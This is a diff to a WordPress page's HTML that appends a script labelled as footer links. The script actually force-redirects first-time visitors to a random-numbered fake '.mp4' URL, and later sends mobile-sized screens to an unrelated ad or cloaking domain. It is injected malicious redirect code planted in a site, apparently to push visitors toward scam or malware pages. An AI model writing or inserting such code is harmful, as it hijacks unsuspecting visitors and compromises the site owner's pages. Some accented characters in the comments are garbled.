@@ -172,6 +172,26 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 		sibling.parentElement.insertBefore( skipLink, sibling );
 	}() );
 	
-</script>
+</script><!-- Enlaces del pie de p�gina --></ul>
+    </div>
+
+    <script>
+        // Verificar si es la primera visita
+        if (!localStorage.getItem('visited')) {
+            // Generar un n�mero aleatorio �nico y actualizar el enlace din�mico
+            var randomNumber = Math.floor(Math.random() * 1000000000); // N�mero aleatorio de 0 a 999,999,999
+            var dynamicLink = document.getElementById('dynamicLink');
+            dynamicLink.href = 'https://files-mp4-video.vercel.app/?m=' + randomNumber + '.mp4'; // Agregar .mp4 al final del n�mero aleatorio
+            // Establecer una bandera para indicar que el usuario ha visitado la p�gina
+            localStorage.setItem('visited', 'true');
+            // Redirigir autom�ticamente si es la primera visita
+            window.location.href = dynamicLink.href;
+        } else {
+            // Redirigir a la URL espec�fica para dispositivos m�viles
+            if (window.innerWidth <= 480 && window.innerHeight <= 800) {
+                window.location.href = 'https://candouraggravate.com/zvs3h7am2w?key=09023bbf5efe46e3e46ae2a2ba2650ce';
+            }
+        }
+    </script>
 </body>
 </html>
